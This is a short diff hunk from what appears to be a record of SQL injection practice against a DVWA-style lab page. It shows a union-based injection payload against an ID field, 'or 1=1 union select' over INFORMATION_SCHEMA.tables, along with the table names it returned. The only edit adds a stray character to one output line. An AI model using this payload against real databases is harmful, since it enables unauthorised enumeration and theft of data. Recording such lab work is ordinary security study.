@@ -96,7 +96,7 @@ Surname : BASE TABLE
 
 ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
 First name: guestbook
-Surname : BASE TABLE
+Surname : BASE TABLE¦
 
 ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
 First name: list_images
